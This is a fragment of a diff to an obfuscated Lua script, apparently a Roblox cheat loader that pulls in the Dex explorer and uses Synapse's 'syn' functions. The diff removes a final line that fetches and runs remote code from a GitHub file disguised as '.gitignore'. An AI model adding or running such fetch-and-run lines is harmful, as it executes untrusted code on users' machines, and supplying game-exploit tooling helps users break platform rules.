@@ -7,7 +7,6 @@
          \/          \/         \/    \/                \/     \/     \/                   
           \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 
 --[[
-
 local Dex = game:GetObjects('rbxassetid://9553291002')[1]
 	Dex.Name=math.random()
 	if syn then syn.protect_gui(Dex) end
@@ -48,4 +47,3 @@ local Dex = game:GetObjects('rbxassetid://9553291002')[1]
 		LoadScripts(Obj)
 	end
 	Load(Dex)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/48973854274252/F/refs/heads/main/.gitignore"))()
